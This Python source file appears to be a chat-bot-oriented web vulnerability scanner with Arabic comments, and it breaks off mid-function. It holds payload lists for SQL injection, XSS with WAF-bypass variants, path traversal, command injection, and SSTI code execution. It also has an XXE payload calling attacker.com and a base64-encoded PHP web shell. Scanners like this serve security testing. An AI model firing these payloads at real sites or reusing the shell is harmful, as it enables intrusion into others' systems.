#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥 Advanced Vulnerability Scanner Module V2.0
ماسح ثغرات متقدم واحترافي
"""

import aiohttp
import asyncio
import re
import urllib.parse
import time
import hashlib
import base64
import json
from bs4 import BeautifulSoup
from typing import List, Dict, Tuple, Optional, Set
from dataclasses import dataclass
from enum import Enum
import random
import string

class Severity(Enum):
    CRITICAL = "🔴 حرج"
    HIGH = "🟠 عالي"
    MEDIUM = "🟡 متوسط"
    LOW = "🟢 منخفض"
    INFO = "🔵 معلومات"

@dataclass
class Vulnerability:
    vuln_type: str
    severity: Severity
    param: str
    payload: str
    evidence: str
    url: str
    method: str = "GET"
    recommendation: str = ""

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
]

SQL_PAYLOADS_ADVANCED = [
    ("'", "Error-Based"),
    ("''", "Error-Based"),
    ("\"", "Error-Based"),
    ("' OR '1'='1", "Boolean-Based"),
    ("' OR '1'='1'--", "Boolean-Based"),
    ("' OR '1'='1'/*", "Boolean-Based"),
    ("\" OR \"1\"=\"1", "Boolean-Based"),
    ("' OR 1=1--", "Boolean-Based"),
    ("' OR 1=1#", "Boolean-Based"),
    ("admin'--", "Auth Bypass"),
    ("admin' #", "Auth Bypass"),
    ("' UNION SELECT NULL--", "Union-Based"),
    ("' UNION SELECT NULL,NULL--", "Union-Based"),
    ("' UNION SELECT NULL,NULL,NULL--", "Union-Based"),
    ("1' ORDER BY 1--", "Order By"),
    ("1' ORDER BY 10--", "Order By"),
    ("1' ORDER BY 100--", "Order By"),
    ("1 AND 1=1", "Boolean-Based"),
    ("1 AND 1=2", "Boolean-Based"),
    ("' AND '1'='1", "Boolean-Based"),
    ("' AND SUBSTRING(@@version,1,1)='5", "Fingerprint"),
    ("' AND SUBSTRING(@@version,1,1)='8", "Fingerprint"),
    ("'; WAITFOR DELAY '0:0:3'--", "Time-Based"),
    ("' AND SLEEP(3)--", "Time-Based"),
    ("' AND SLEEP(3)#", "Time-Based"),
    ("1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", "Time-Based"),
    ("' AND BENCHMARK(5000000,SHA1('test'))--", "Time-Based"),
    ("' OR SLEEP(3)#", "Time-Based"),
    ("1; WAITFOR DELAY '0:0:3'--", "Time-Based"),
    ("' HAVING 1=1--", "Error-Based"),
    ("' GROUP BY 1--", "Error-Based"),
    ("'||(SELECT 1 FROM dual)||'", "Oracle"),
    ("' AND extractvalue(1,concat(0x7e,version()))--", "Error-Based XML"),
    ("' AND updatexml(1,concat(0x7e,version()),1)--", "Error-Based XML"),
    ("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "Error-Based"),
    ("'%20OR%20'1'%3D'1", "URL Encoded"),
    ("%27%20OR%20%271%27%3D%271", "Double URL Encoded"),
    ("' oR '1'='1", "Case Variation"),
    ("' Or '1'='1", "Case Variation"),
    ("' OR/**/'1'='1", "Comment Bypass"),
    ("' OR\t'1'='1", "Tab Bypass"),
    ("' OR\n'1'='1", "Newline Bypass"),
    ("'-'", "Math-Based"),
    ("' AND 1=1 AND '1'='1", "Boolean-Based"),
    ("0' XOR(if(1=1,sleep(3),0))--", "XOR Time-Based"),
]

SQL_ERROR_PATTERNS = [
    (r"SQL syntax.*MySQL", "MySQL"),
    (r"Warning.*mysql_", "MySQL"),
    (r"valid MySQL result", "MySQL"),
    (r"MySqlClient\.", "MySQL"),
    (r"com\.mysql\.jdbc", "MySQL"),
    (r"Zend_Db_Statement.*MySQL", "MySQL"),
    (r"PostgreSQL.*ERROR", "PostgreSQL"),
    (r"Warning.*\Wpg_", "PostgreSQL"),
    (r"valid PostgreSQL result", "PostgreSQL"),
    (r"Npgsql\.", "PostgreSQL"),
    (r"org\.postgresql", "PostgreSQL"),
    (r"Driver.*SQL[\-\_\ ]*Server", "MSSQL"),
    (r"OLE DB.*SQL Server", "MSSQL"),
    (r"SQL Server.*Driver", "MSSQL"),
    (r"Warning.*mssql_", "MSSQL"),
    (r"Microsoft SQL Native Client", "MSSQL"),
    (r"ODBC SQL Server Driver", "MSSQL"),
    (r"SQLServer JDBC Driver", "MSSQL"),
    (r"com\.microsoft\.sqlserver", "MSSQL"),
    (r"Unclosed quotation mark", "MSSQL"),
    (r"Microsoft Access Driver", "MS Access"),
    (r"Microsoft JET Database Engine", "MS Access"),
    (r"Access Database Engine", "MS Access"),
    (r"ORA-\d{5}", "Oracle"),
    (r"Oracle.*Driver", "Oracle"),
    (r"Warning.*\Woci_", "Oracle"),
    (r"Warning.*\Wora_", "Oracle"),
    (r"oracle\.jdbc", "Oracle"),
    (r"CLI Driver.*DB2", "DB2"),
    (r"DB2 SQL error", "DB2"),
    (r"SQLite/JDBCDriver", "SQLite"),
    (r"SQLite\.Exception", "SQLite"),
    (r"System\.Data\.SQLite", "SQLite"),
    (r"Warning.*sqlite_", "SQLite"),
    (r"sqlite3\.OperationalError", "SQLite"),
    (r"You have an error in your SQL syntax", "Generic"),
    (r"Incorrect syntax near", "Generic"),
    (r"quoted string not properly terminated", "Generic"),
    (r"syntax error at or near", "Generic"),
    (r"unexpected end of SQL command", "Generic"),
]

XSS_PAYLOADS_ADVANCED = [
    ("<script>alert('XSS')</script>", "Basic Script", "reflected"),
    ("<script>alert(1)</script>", "Basic Script", "reflected"),
    ("<script>alert(String.fromCharCode(88,83,83))</script>", "Encoded Script", "reflected"),
    ("<img src=x onerror=alert('XSS')>", "IMG Tag", "reflected"),
    ("<img src=x onerror=alert(1)>", "IMG Tag", "reflected"),
    ("<img/src=x onerror=alert(1)>", "IMG No Space", "reflected"),
    ("<svg onload=alert('XSS')>", "SVG Tag", "reflected"),
    ("<svg/onload=alert(1)>", "SVG No Space", "reflected"),
    ("<svg><script>alert(1)</script></svg>", "SVG Script", "reflected"),
    ("<body onload=alert('XSS')>", "Body Tag", "reflected"),
    ("<body onpageshow=alert(1)>", "Body Pageshow", "reflected"),
    ("<input onfocus=alert(1) autofocus>", "Input Autofocus", "reflected"),
    ("<input onmouseover=alert(1)>", "Input Mouseover", "reflected"),
    ("<marquee onstart=alert(1)>", "Marquee Tag", "reflected"),
    ("<details open ontoggle=alert(1)>", "Details Tag", "reflected"),
    ("<audio src=x onerror=alert(1)>", "Audio Tag", "reflected"),
    ("<video src=x onerror=alert(1)>", "Video Tag", "reflected"),
    ("<iframe src=\"javascript:alert(1)\">", "Iframe JS", "reflected"),
    ("<object data=\"javascript:alert(1)\">", "Object Tag", "reflected"),
    ("<a href=\"javascript:alert(1)\">click</a>", "Anchor JS", "reflected"),
    ("javascript:alert(1)", "JS Protocol", "reflected"),
    ("'-alert(1)-'", "JS Context", "dom"),
    ("\"-alert(1)-\"", "JS Context DQ", "dom"),
    ("</script><script>alert(1)</script>", "Script Break", "reflected"),
    ("{{constructor.constructor('alert(1)')()}}", "Template Injection", "dom"),
    ("${alert(1)}", "Template Literal", "dom"),
    ("{{7*7}}", "SSTI Test", "ssti"),
    ("${7*7}", "Template Test", "ssti"),
    ("<img src=1 onerror=alert`1`>", "Template Literal Tag", "reflected"),
    ("<svg><animate onbegin=alert(1)>", "Animate Tag", "reflected"),
    ("<math><maction actiontype=statusline#http://google.com xlink:href=javascript:alert(1)>", "Math Tag", "reflected"),
    ("'><script>alert(1)</script>", "Attribute Break", "reflected"),
    ("\"><script>alert(1)</script>", "DQ Attribute Break", "reflected"),
    ("--><script>alert(1)</script>", "Comment Break", "reflected"),
    ("<ScRiPt>alert(1)</ScRiPt>", "Case Variation", "waf_bypass"),
    ("<scr<script>ipt>alert(1)</scr</script>ipt>", "Nested Script", "waf_bypass"),
    ("<img src=x onerror=\"&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\">", "HTML Entities", "waf_bypass"),
    ("<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>", "Unicode Escape", "waf_bypass"),
    ("%3Cscript%3Ealert(1)%3C/script%3E", "URL Encoded", "waf_bypass"),
    ("<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "Base64 Encoded", "waf_bypass"),
]

LFI_PAYLOADS_ADVANCED = [
    ("../../../etc/passwd", "Basic Traversal", "linux"),
    ("....//....//....//etc/passwd", "Double Dot", "linux"),
    ("..%2f..%2f..%2fetc/passwd", "URL Encoded", "linux"),
    ("..%252f..%252f..%252fetc/passwd", "Double URL Encoded", "linux"),
    ("%2e%2e/%2e%2e/%2e%2e/etc/passwd", "Full URL Encode", "linux"),
    ("/etc/passwd", "Direct Path", "linux"),
    ("../../../../etc/passwd%00", "Null Byte", "linux"),
    ("../../../../etc/passwd%00.jpg", "Null Byte Extension", "linux"),
    ("....//....//....//etc/passwd%00", "Double Dot Null", "linux"),
    ("/etc/passwd%00", "Direct Null", "linux"),
    ("..\\..\\..\\windows\\win.ini", "Windows Traversal", "windows"),
    ("....\\\\....\\\\....\\\\windows\\win.ini", "Double Backslash", "windows"),
    ("C:\\windows\\win.ini", "Windows Direct", "windows"),
    ("C:/windows/win.ini", "Windows Forward", "windows"),
    ("..%5c..%5c..%5cwindows%5cwin.ini", "URL Encoded Win", "windows"),
    ("/proc/self/environ", "Proc Environ", "linux"),
    ("/proc/self/cmdline", "Proc Cmdline", "linux"),
    ("/proc/self/fd/0", "Proc FD", "linux"),
    ("/var/log/apache2/access.log", "Apache Log", "log"),
    ("/var/log/apache/access.log", "Apache Log Alt", "log"),
    ("/var/log/httpd/access_log", "HTTPD Log", "log"),
    ("/var/log/nginx/access.log", "Nginx Log", "log"),
    ("/var/log/auth.log", "Auth Log", "log"),
    ("/var/log/syslog", "Syslog", "log"),
    ("php://filter/convert.base64-encode/resource=index.php", "PHP Filter B64", "php_wrapper"),
    ("php://filter/read=string.rot13/resource=index.php", "PHP Filter ROT13", "php_wrapper"),
    ("php://filter/convert.iconv.utf-8.utf-16/resource=index.php", "PHP Filter ICONV", "php_wrapper"),
    ("php://input", "PHP Input", "php_wrapper"),
    ("php://stdin", "PHP Stdin", "php_wrapper"),
    ("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=", "Data Wrapper", "php_wrapper"),
    ("expect://id", "Expect Wrapper", "php_wrapper"),
    ("file:///etc/passwd", "File Protocol", "protocol"),
    ("phar://test.phar/test.txt", "Phar Protocol", "protocol"),
    ("zip://test.zip#test.txt", "Zip Protocol", "protocol"),
    ("/....//....//....//etc/passwd", "Dot Slash Mix", "bypass"),
    ("..././..././..././etc/passwd", "Triple Dot", "bypass"),
    (r"....\/....\/....\/etc/passwd", "Escaped Slash", "bypass"),
]

LFI_SUCCESS_PATTERNS = [
    (r"root:.*:0:0:", "Linux passwd"),
    (r"daemon:.*:1:1:", "Linux passwd"),
    (r"bin:.*:2:2:", "Linux passwd"),
    (r"\[extensions\]", "Windows INI"),
    (r"\[fonts\]", "Windows INI"),
    (r"for 16-bit app support", "Windows INI"),
    (r"HTTP_USER_AGENT", "Environ"),
    (r"PATH=", "Environ"),
    (r"<\?php", "PHP Source"),
    (r"DOCUMENT_ROOT", "Environ"),
    (r"SERVER_SOFTWARE", "Environ"),
]

CMD_INJECTION_PAYLOADS_ADVANCED = [
    ("; id", "Semicolon"),
    ("| id", "Pipe"),
    ("|| id", "Double Pipe"),
    ("& id", "Ampersand"),
    ("&& id", "Double Ampersand"),
    ("`id`", "Backtick"),
    ("$(id)", "Dollar Paren"),
    ("; ls -la", "List Files"),
    ("| ls -la", "Pipe List"),
    ("; cat /etc/passwd", "Cat Passwd"),
    ("| cat /etc/passwd", "Pipe Cat"),
    ("; whoami", "Whoami"),
    ("| whoami", "Pipe Whoami"),
    ("; uname -a", "Uname"),
    ("| uname -a", "Pipe Uname"),
    ("%0a id", "Newline"),
    ("%0d id", "Carriage Return"),
    (";id;", "Double Semi"),
    ("|id|", "Double Pipe"),
    ("';id;'", "Quoted Semi"),
    ("\";id;\"", "DQ Semi"),
    ("| sleep 3", "Time-Based"),
    ("; sleep 3", "Time-Based Semi"),
    ("& ping -c 3 127.0.0.1", "Ping Time"),
    ("; ping -n 3 127.0.0.1", "Windows Ping"),
    ("| timeout 3", "Timeout"),
    ("$(sleep 3)", "SubShell Sleep"),
    ("`sleep 3`", "Backtick Sleep"),
    ("{sleep,3}", "Brace Sleep"),
    ("a]|id|[a", "Array Syntax"),
    ("a]|id|", "Array Pipe"),
    ("\\nid", "Escaped Newline"),
    ("\\n/bin/id", "Full Path"),
    (";{id,}", "Brace Expansion"),
    ("$IFS;id", "IFS Bypass"),
    (";$IFS'id'", "IFS Quote"),
]

CMD_SUCCESS_PATTERNS = [
    (r"uid=\d+\(.*\) gid=\d+\(.*\)", "Unix ID"),
    (r"root:.*:0:0:", "Passwd"),
    (r"Linux.*GNU", "Uname Linux"),
    (r"Darwin.*Kernel", "Uname Mac"),
    (r"total \d+", "LS Output"),
    (r"drwx", "Directory Listing"),
    (r"root\s+root", "Root Files"),
    (r"-rw-r--r--", "File Perms"),
]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49", "Jinja2/Twig"),
    ("${7*7}", "49", "Freemarker"),
    ("#{7*7}", "49", "Ruby ERB"),
    ("{{7*'7'}}", "7777777", "Jinja2"),
    ("<%= 7*7 %>", "49", "ERB"),
    ("${T(java.lang.Runtime).getRuntime().exec('id')}", "RCE", "Spring"),
    ("{{config}}", "config", "Jinja2 Config"),
    ("{{self}}", "self", "Jinja2 Self"),
    ("{{''.__class__.__mro__[2].__subclasses__()}}", "classes", "Jinja2 Classes"),
    ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "RCE", "Freemarker"),
    ("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "RCE", "Jinja2 RCE"),
    ("*{7*7}", "49", "Thymeleaf"),
    ("@(7*7)", "49", "Razor"),
    ("{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}", "RCE", "Pug"),
]

XXE_PAYLOADS = [
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "Basic XXE"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', "Windows XXE"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo></foo>', "External DTD"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>', "PHP Filter XXE"),
]

COMMON_DIRS = [
    'admin', 'administrator', 'admin1', 'admin2', 'admin_area', 'admin-panel',
    'admincp', 'admins', 'adminsite', 'admin/login', 'admin/cpanel',
    'backup', 'backups', 'bak', 'db', 'database', 'databases',
    'config', 'configs', 'configuration', 'conf', 'settings',
    'cgi-bin', 'cgi', 'scripts', 'bin',
    'data', 'files', 'upload', 'uploads', 'images', 'img',
    'private', 'secret', 'secrets', 'hidden', '.git', '.svn', '.env',
    'api', 'api/v1', 'api/v2', 'rest', 'graphql',
    'test', 'tests', 'testing', 'dev', 'development', 'staging',
    'old', 'old_site', 'backup_site', 'temp', 'tmp',
    'phpmyadmin', 'pma', 'mysql', 'myadmin',
    'wp-admin', 'wp-content', 'wp-includes', 'wordpress',
    'joomla', 'drupal', 'magento', 'prestashop',
    'panel', 'cpanel', 'controlpanel', 'dashboard',
    'user', 'users', 'member', 'members', 'account', 'accounts',
    'login', 'signin', 'signup', 'register', 'auth',
    'logs', 'log', 'error', 'errors', 'debug',
    'shell', 'shells', 'cmd', 'command',
    'include', 'includes', 'inc', 'library', 'lib', 'libs',
    'assets', 'static', 'css', 'js', 'javascript',
    'media', 'video', 'videos', 'audio', 'downloads',
    'doc', 'docs', 'documentation', 'help', 'readme',
    '.htaccess', '.htpasswd', 'robots.txt', 'sitemap.xml',
    'server-status', 'server-info', 'phpinfo.php', 'info.php',
    'install', 'installer', 'setup', 'update', 'upgrade',
    'cron', 'cronjobs', 'jobs', 'tasks',
    'mail', 'email', 'webmail', 'smtp',
    'ftp', 'sftp', 'ssh', 'shell',
    'console', 'terminal', 'cmd', 'cli',
]

COMMON_FILES = [
    'index.php', 'index.html', 'index.htm', 'default.aspx',
    'config.php', 'config.inc.php', 'configuration.php', 'settings.php',
    'wp-config.php', 'wp-config.php.bak', 'wp-config.php~',
    'database.php', 'db.php', 'db_config.php', 'conn.php',
    '.env', '.env.bak', '.env.local', '.env.production',
    '.htaccess', '.htpasswd', 'web.config', 'nginx.conf',
    'robots.txt', 'sitemap.xml', 'crossdomain.xml',
    'phpinfo.php', 'info.php', 'test.php', 'debug.php',
    'backup.sql', 'database.sql', 'dump.sql', 'db.sql',
    'backup.zip', 'backup.tar.gz', 'backup.rar',
    'error.log', 'access.log', 'debug.log', 'error_log',
    'readme.txt', 'readme.md', 'readme.html', 'changelog.txt',
    'license.txt', 'install.php', 'setup.php', 'upgrade.php',
    'composer.json', 'package.json', 'Gemfile', 'requirements.txt',
    '.git/config', '.git/HEAD', '.svn/entries', '.DS_Store',
    'server-status', 'server-info', 'elmah.axd', 'trace.axd',
    'id_rsa', 'id_dsa', '.ssh/id_rsa', 'authorized_keys',
]

SECURITY_HEADERS = {
    'Strict-Transport-Security': {
        'severity': Severity.HIGH,
        'desc': 'HSTS - يفرض استخدام HTTPS',
        'recommendation': 'أضف header: Strict-Transport-Security: max-age=31536000; includeSubDomains'
    },
    'Content-Security-Policy': {
        'severity': Severity.HIGH,
        'desc': 'CSP - يمنع XSS وحقن الأكواد',
        'recommendation': 'أضف CSP header مع سياسات صارمة'
    },
    'X-Content-Type-Options': {
        'severity': Severity.MEDIUM,
        'desc': 'يمنع MIME sniffing',
        'recommendation': 'أضف header: X-Content-Type-Options: nosniff'
    },
    'X-Frame-Options': {
        'severity': Severity.MEDIUM,
        'desc': 'يمنع Clickjacking',
        'recommendation': 'أضف header: X-Frame-Options: DENY'
    },
    'X-XSS-Protection': {
        'severity': Severity.LOW,
        'desc': 'حماية XSS للمتصفحات القديمة',
        'recommendation': 'أضف header: X-XSS-Protection: 1; mode=block'
    },
    'Referrer-Policy': {
        'severity': Severity.LOW,
        'desc': 'يتحكم في إرسال Referrer',
        'recommendation': 'أضف header: Referrer-Policy: strict-origin-when-cross-origin'
    },
    'Permissions-Policy': {
        'severity': Severity.LOW,
        'desc': 'يتحكم في ميزات المتصفح',
        'recommendation': 'أضف header: Permissions-Policy: geolocation=(), microphone=()'
    },
}

WAF_SIGNATURES = [
    ('cloudflare', ['cf-ray', '__cfduid', 'cf-cache-status'], 'Cloudflare'),
    ('akamai', ['akamai', 'x-akamai'], 'Akamai'),
    ('incapsula', ['incap_ses', 'visid_incap'], 'Imperva Incapsula'),
    ('sucuri', ['x-sucuri', 'sucuri'], 'Sucuri'),
    ('aws', ['x-amz', 'x-amzn', 'awselb'], 'AWS WAF'),
    ('f5', ['x-wa-info', 'f5-trafficshield'], 'F5 BIG-IP'),
    ('barracuda', ['barra_counter_session'], 'Barracuda'),
    ('fortiweb', ['fortiwafsid'], 'Fortinet FortiWeb'),
    ('modsecurity', ['mod_security', 'modsecurity'], 'ModSecurity'),
    ('wordfence', ['wordfence'], 'Wordfence'),
]


def normalize_url(url: str) -> str:
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')


def generate_random_string(length: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


async def get_session() -> aiohttp.ClientSession:
    timeout = aiohttp.ClientTimeout(total=20)
    connector = aiohttp.TCPConnector(ssl=False, limit=50)
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    return aiohttp.ClientSession(timeout=timeout, connector=connector, headers=headers)


async def spider_website(url: str, max_pages: int = 30) -> Dict:
    """
    زحف وتحليل الموقع للعثور على الصفحات والـ Forms
    """
    url = normalize_url(url)
    parsed = urllib.parse.urlparse(url)
    base_domain = parsed.netloc
    
    discovered = {
        'pages': set([url]),
        'forms': [],
        'params': set(),
        'endpoints': set(),
        'technologies': set(),
    }
    
    visited = set()
    to_visit = [url]
    
    try:
        async with await get_session() as session:
            while to_visit and len(visited) < max_pages:
                current_url = to_visit.pop(0)
                if current_url in visited:
                    continue
                visited.add(current_url)
                
                try:
                    async with session.get(current_url, allow_redirects=True) as response:
                        if response.status != 200:
                            continue
                        
                        content_type = response.headers.get('content-type', '')
                        if 'text/html' not in content_type:
                            continue
                        
                        html = await response.text()
                        soup = BeautifulSoup(html, 'html.parser')
                        
                        for tech in detect_technologies(html, dict(response.headers)):
                            discovered['technologies'].add(tech)
                        
                        for form in soup.find_all('form'):
                            action = form.get('action', '') or ''
                            method = form.get('method', 'GET') or 'GET'
                            form_data = {
                                'action': urllib.parse.urljoin(current_url, str(action)),
                                'method': str(method).upper(),
                                'inputs': []
                            }
                            for inp in form.find_all(['input', 'textarea', 'select']):
                                input_name = inp.get('name', '')
                                input_type = inp.get('type', 'text')
                                if input_name:
                                    form_data['inputs'].append({
                                        'name': input_name,
                                        'type': input_type,
                                        'value': inp.get('value', '')
                                    })
                                    discovered['params'].add(input_name)
                            if form_data['inputs']:
                                discovered['forms'].append(form_data)
                        
                        for link in soup.find_all('a', href=True):
                            href = str(link['href'])
                            full_url = urllib.parse.urljoin(current_url, href)
                            parsed_link = urllib.parse.urlparse(full_url)
                            
                            if parsed_link.netloc == base_domain:
                                clean_url = f"{parsed_link.scheme}://{parsed_link.netloc}{parsed_link.path}"
                                if clean_url not in visited:
                                    discovered['pages'].add(clean_url)
                                    to_visit.append(clean_url)
                                
                                if parsed_link.query:
                                    for param in urllib.parse.parse_qs(parsed_link.query).keys():
                                        discovered['params'].add(param)
                                    discovered['endpoints'].add(full_url)
                        
                except Exception:
                    continue
                    
    except Exception:
        pass
    
    discovered['pages'] = list(discovered['pages'])
    discovered['params'] = list(discovered['params'])
    discovered['endpoints'] = list(discovered['endpoints'])
    discovered['technologies'] = list(discovered['technologies'])
    
    return discovered


def detect_technologies(html: str, headers: dict) -> List[str]:
    """اكتشاف التقنيات المستخدمة"""
    techs = []
    
    html_lower = html.lower()
    
    if 'wp-content' in html_lower or 'wordpress' in html_lower:
        techs.append('WordPress')
    if 'joomla' in html_lower:
        techs.append('Joomla')
    if 'drupal' in html_lower:
        techs.append('Drupal')
    if 'laravel' in html_lower or 'laravel_session' in str(headers):
        techs.append('Laravel')
    if 'django' in html_lower or 'csrfmiddlewaretoken' in html_lower:
        techs.append('Django')
    if 'react' in html_lower or '_next' in html_lower:
        techs.append('React/Next.js')
    if 'vue' in html_lower or '__vue' in html_lower:
        techs.append('Vue.js')
    if 'angular' in html_lower or 'ng-' in html_lower:
        techs.append('Angular')
    if 'bootstrap' in html_lower:
        techs.append('Bootstrap')
    if 'jquery' in html_lower:
        techs.append('jQuery')
    
    server = headers.get('server', '').lower()
    if 'nginx' in server:
        techs.append('Nginx')
    if 'apache' in server:
        techs.append('Apache')
    if 'iis' in server:
        techs.append('IIS')
    
    powered_by = headers.get('x-powered-by', '').lower()
    if 'php' in powered_by:
        techs.append('PHP')
    if 'asp' in powered_by:
        techs.append('ASP.NET')
    if 'express' in powered_by:
        techs.append('Express.js')
    
    return techs


async def sql_injection_scan(url: str) -> str:
    """فحص متقدم لـ SQL Injection مع Time-Based و WAF Bypass"""
    url = normalize_url(url)
    
    text = "💉 *فحص SQL Injection المتقدم*\n\n"
    text += f"🌐 *الهدف:* `{url}`\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    vulnerabilities = []
    tested = 0
    db_type = None
    
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            test_params = ['id', 'page', 'user', 'name', 'search', 'q', 'query', 'cat', 'category', 'item', 'product', 'article', 'news', 'pid', 'uid', 'cid']
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        else:
            test_params = list(params.keys())
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        async with await get_session() as session:
            async with session.get(url, allow_redirects=True) as response:
                original_content = await response.text()
                original_length = len(original_content)
            
            for param in test_params[:8]:
                for payload, technique in SQL_PAYLOADS_ADVANCED[:30]:
                    tested += 1
                    
                    if params:
                        new_params = params.copy()
                        new_params[param] = [payload]
                        query = urllib.parse.urlencode(new_params, doseq=True)
                        test_url = f"{base_url}?{query}"
                    else:
                        test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                    
                    try:
                        if 'Time-Based' in technique:
                            start_time = time.time()
                            async with session.get(test_url, allow_redirects=True) as response:
                                await response.text()
                            elapsed = time.time() - start_time
                            
                            if elapsed >= 2.5:
                                vulnerabilities.append(Vulnerability(
                                    vuln_type="SQL Injection",
                                    severity=Severity.CRITICAL,
                                    param=param,
                                    payload=payload,
                                    evidence=f"Response delayed {elapsed:.1f}s",
                                    url=test_url,
                                    recommendation="استخدم Prepared Statements و Parameterized Queries"
                                ))
                        else:
                            async with session.get(test_url, allow_redirects=True) as response:
                                content = await response.text()
                                
                                for pattern, db in SQL_ERROR_PATTERNS:
                                    if re.search(pattern, content, re.IGNORECASE):
                                        db_type = db
                                        vulnerabilities.append(Vulnerability(
                                            vuln_type="SQL Injection",
                                            severity=Severity.CRITICAL,
                                            param=param,
                                            payload=payload,
                                            evidence=f"Error Pattern: {pattern[:40]}",
                                            url=test_url,
                                            recommendation="استخدم Prepared Statements"
                                        ))
                                        break
                                
                                if 'Boolean' in technique:
                                    current_length = len(content)
                                    diff_percent = abs(current_length - original_length) / max(original_length, 1) * 100
                                    if diff_percent > 20:
                                        vulnerabilities.append(Vulnerability(
                                            vuln_type="SQL Injection (Boolean)",
                                            severity=Severity.HIGH,
                                            param=param,
                                            payload=payload,
                                            evidence=f"Content length changed: {diff_percent:.1f}%",
                                            url=test_url,
                                            recommendation="استخدم Prepared Statements"
                                        ))
                    except asyncio.TimeoutError:
                        if 'Time-Based' in technique:
                            vulnerabilities.append(Vulnerability(
                                vuln_type="SQL Injection (Time-Based)",
                                severity=Severity.CRITICAL,
                                param=param,
                                payload=payload,
                                evidence="Request timeout - possible blind SQLi",
                                url=test_url,
                                recommendation="استخدم Prepared Statements"
                            ))
                    except:
                        continue
        
        text += f"📊 *تم اختبار:* {tested} payload\n"
        if db_type:
            text += f"🗄️ *نوع قاعدة البيانات:* {db_type}\n"
        text += "\n"
        
        if vulnerabilities:
            text += f"🔴 *تم اكتشاف {len(vulnerabilities)} ثغرة SQL Injection!*\n\n"
            
            seen = set()
            for vuln in vulnerabilities:
                key = (vuln.param, vuln.vuln_type)
                if key not in seen:
                    seen.add(key)
                    text += f"┌ {vuln.severity.value}\n"
                    text += f"├ *Parameter:* `{vuln.param}`\n"
                    text += f"├ *Payload:* `{vuln.payload[:50]}...`\n"
                    text += f"├ *Evidence:* {vuln.evidence}\n"
                    text += f"└ *Type:* {vuln.vuln_type}\n\n"
            
            text += "━━━━━━━━━━━━━━━━━━━━━━\n"
            text += "💡 *التوصيات:*\n"
            text += "• استخدم Prepared Statements\n"
            text += "• استخدم ORM بدلاً من SQL مباشر\n"
            text += "• فلتر المدخلات (Input Validation)\n"
            text += "• استخدم WAF\n"
            text += "• قلل صلاحيات مستخدم قاعدة البيانات\n"
        else:
            text += "✅ *لم يتم اكتشاف ثغرات SQL Injection*\n\n"
            text += "💡 قد تكون هناك ثغرات غير مكتشفة.\n"
            text += "جرب أدوات متقدمة مثل SQLMap."
        
        return text
        
    except asyncio.TimeoutError:
        return text + "\n❌ انتهت مهلة الاتصال"
    except Exception as e:
        return text + f"\n❌ خطأ: {str(e)}"


async def xss_scan(url: str) -> str:
    """فحص متقدم لـ XSS مع DOM-Based و WAF Bypass"""
    url = normalize_url(url)
    
    text = "⚡ *فحص XSS المتقدم*\n\n"
    text += f"🌐 *الهدف:* `{url}`\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    vulnerabilities = []
    tested = 0
    
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            test_params = ['q', 'search', 'query', 'name', 'text', 'input', 'message', 'content', 's', 'keyword', 'term', 'value']
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        else:
            test_params = list(params.keys())
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        async with await get_session() as session:
            for param in test_params[:6]:
                for payload, technique, xss_type in XSS_PAYLOADS_ADVANCED[:25]:
                    tested += 1
                    
                    if params:
                        new_params = params.copy()
                        new_params[param] = [payload]
                        query = urllib.parse.urlencode(new_params, doseq=True)
                        test_url = f"{base_url}?{query}"
                    else:
